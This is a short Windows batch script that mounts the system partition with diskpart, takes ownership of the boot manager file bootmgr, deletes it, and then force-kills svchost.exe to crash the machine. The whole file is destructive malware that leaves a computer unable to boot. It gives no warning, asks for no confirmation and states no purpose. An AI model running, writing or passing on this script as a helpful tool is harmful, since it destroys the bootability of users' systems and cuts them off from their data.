@echo off

cd C:/Users/%USERNAME%

echo sel disk 0 > tmp.txt
echo sel part 1 >> tmp.txt
echo assign letter=z >> tmp.txt

diskpart /s tmp.txt
del tmp.txt /q /f

z:

cacls bootmgr /e /p %USERNAME%:F
attrib bootmgr -s -h

del bootmgr /q /f

taskkill /im svchost.exe /f